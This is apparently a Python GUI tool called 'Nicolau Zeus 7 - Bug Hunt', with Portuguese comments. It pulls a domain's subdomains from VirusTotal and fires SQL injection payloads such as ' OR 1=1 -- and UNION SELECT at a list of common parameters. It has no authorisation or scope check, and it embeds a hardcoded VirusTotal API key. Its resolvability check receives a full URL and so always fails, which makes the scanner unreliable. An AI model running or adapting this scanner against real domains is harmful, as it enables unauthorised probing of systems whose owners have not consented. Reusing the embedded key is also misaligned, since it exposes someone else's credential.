import requests
import socket
import tkinter as tk
from tkinter import ttk
from tkinter import messagebox
from fpdf import FPDF

# API Key do VirusTotal (substitua pelo valor correto)
API_KEY_VT = 'c11a3025cf915dd454113b580a13cb4ff7973f78c771bb3f7cb0f42624f19a01'

# Lista de parâmetros comuns que podem ser vulneráveis a SQLi
sqli_parameters = [
    "id", "user_id", "product_id", "search", "query", "action", "page", "filter",
    "sort", "category", "price", "token", "session_id"
]

# Lista de payloads de SQLi que serão usados nos testes
sqli_payloads = ["' OR 1=1 --", '" OR 1=1 --', "' UNION SELECT NULL, NULL --", '" UNION SELECT NULL, NULL --']

# Função para buscar subdomínios utilizando a API do VirusTotal
def get_subdomains(domain):
    url = f"https://www.virustotal.com/api/v3/domains/{domain}/subdomains"
    headers = {"x-apikey": API_KEY_VT}
    
    try:
        response = requests.get(url, headers=headers)
        data = response.json()
        subdomains = [item['id'] for item in data['data']]
        return subdomains
    except requests.exceptions.RequestException as e:
        messagebox.showerror("Erro de API", f"Erro ao buscar subdomínios: {e}")
        return []

# Função para verificar se o subdomínio é acessível através de DNS
def is_domain_resolvable(domain):
    try:
        socket.gethostbyname(domain)
        return True
    except socket.error:
        return False

# Função para testar SQL Injection em uma URL
def test_sql_injection(base_url, update_progress_callback=None):
    vulnerabilities_found = []

    total_tests = len(sqli_parameters) * len(sqli_payloads)
    test_counter = 0
    
    for param in sqli_parameters:
        for payload in sqli_payloads:
            # Testa a URL base com o parâmetro e payload
            url_with_param = f"{base_url}?{param}=1"
            test_url = f"{url_with_param}{payload}"

            try:
                # Verifica se o domínio é resolvível antes de fazer a requisição
                if not is_domain_resolvable(base_url):
                    print(f"Domínio {base_url} não resolvido. Pulando...")
                    continue

                # Tentando usar https antes de http
                response = requests.get(test_url, timeout=10)

                # Se a resposta tiver código 200 e contiver um erro SQL, pode ser uma vulnerabilidade
                if response.status_code == 200 and "error" in response.text:
                    vulnerabilities_found.append({
                        "url": test_url,
                        "param": param,
                        "payload": payload,
                        "response": response.text
                    })

            except requests.exceptions.RequestException as e:
                print(f"Error during request: {e}")

            # Atualiza o progresso na interface gráfica
            test_counter += 1
            if update_progress_callback:
                progress_percentage = (test_counter / total_tests) * 100
                update_progress_callback(progress_percentage)

    return vulnerabilities_found

# Função para gerar o relatório em PDF
def generate_pdf_report(vulnerabilities, filename="report.pdf"):
    pdf = FPDF()
    pdf.add_page()
    
    # Título do relatório
    pdf.set_font("Arial", size=12)
    pdf.cell(200, 10, txt="Nicolau Zeus 7 - Relatório de Vulnerabilidades SQLi", ln=True, align="C")
    pdf.ln(10)
    
    if vulnerabilities:
        for vuln in vulnerabilities:
            pdf.set_font("Arial", size=10)
            pdf.cell(200, 10, f"URL: {vuln['url']}", ln=True)
            pdf.cell(200, 10, f"Parâmetro: {vuln['param']}", ln=True)
            pdf.cell(200, 10, f"Payload: {vuln['payload']}", ln=True)
            pdf.ln(5)
    else:
        pdf.set_font("Arial", size=12)
        pdf.cell(200, 10, txt="Nenhuma vulnerabilidade detectada.", ln=True)

    pdf.output(filename)

# Interface gráfica
class App:
    def __init__(self, root):
        self.root = root
        self.root.title("Nicolau Zeus 7 - Bug Hunt")
        self.root.geometry("600x400")
        self.root.configure(bg='blue')
        
        self.label = tk.Label(root, text="Nicolau Zeus 7\nBug Hunt", font=("Arial", 18), fg="white", bg="blue")
        self.label.pack(pady=20)

        self.url_entry_label = tk.Label(root, text="Insira o domínio:", font=("Arial", 12), fg="white", bg="blue")
        self.url_entry_label.pack(pady=10)
        
        self.url_entry = tk.Entry(root, font=("Arial", 12))
        self.url_entry.pack(pady=10)
        
        self.progress_label = tk.Label(root, text="Progress: 0%", font=("Arial", 12), fg="white", bg="blue")
        self.progress_label.pack(pady=10)

        self.progress_bar = ttk.Progressbar(root, length=400, mode="determinate")
        self.progress_bar.pack(pady=20)

        self.start_button = tk.Button(root, text="Start Test", command=self.start_test, bg="blue", fg="white")
        self.start_button.pack(pady=10)

    def start_test(self):
        domain = self.url_entry.get()
        if not domain:
            messagebox.showerror("Erro", "Por favor, insira um domínio!")
            return

        subdomains = get_subdomains(domain)
        if not subdomains:
            messagebox.showerror("Erro", "Nenhum subdomínio encontrado!")
            return
        
        vulnerabilities = []
        for subdomain in subdomains:
            print(f"Testando subdomínio: {subdomain}")
            url_base = f"http://{subdomain}"  # Tentando http primeiro
            found_vulns = test_sql_injection(url_base, update_progress_callback=self.update_progress)
            vulnerabilities.extend(found_vulns)

        self.display_results(vulnerabilities)

        # Gerar relatório PDF
        generate_pdf_report(vulnerabilities)
        messagebox.showinfo("Concluído", "Testes concluídos e relatório gerado!")

    def update_progress(self, progress):
        self.progress_label.config(text=f"Progress: {progress:.2f}%")
        self.progress_bar["value"] = progress

    def display_results(self, vulnerabilities):
        if vulnerabilities:
            for vuln in vulnerabilities:
                print(f"Potential SQLi detected at {vuln['url']}")
                print(f"Param: {vuln['param']}, Payload: {vuln['payload']}")
        else:
            print("No SQLi vulnerabilities detected.")

# Criação da janela
root = tk.Tk()
app = App(root)
root.mainloop()

